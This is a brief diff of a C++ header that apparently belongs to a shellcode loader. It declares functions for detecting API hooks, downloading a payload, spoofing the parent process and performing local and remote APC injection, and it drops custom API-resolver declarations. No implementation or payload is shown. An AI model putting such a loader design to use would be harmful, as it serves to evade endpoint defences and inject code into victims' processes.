@@ -7,8 +7,8 @@ BOOL isItHooked(LPVOID addr);
 std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);
 DWORD GetPID();
 
-void raw_exec_ppid(std::vector<BYTE> sh, DWORD exPID);
+void Indirect_RawExec_ppid(std::vector<BYTE> sh, DWORD exPID);
 void IndirectAPC();
+void IndirectRemoteAPC(DWORD exPID);
 
-FARPROC CustomGetProcAddress(IN HMODULE hModule, IN DWORD lpApiName);
-HMODULE CustomGetModuleHandle(IN LPCWSTR szModuleName);
+
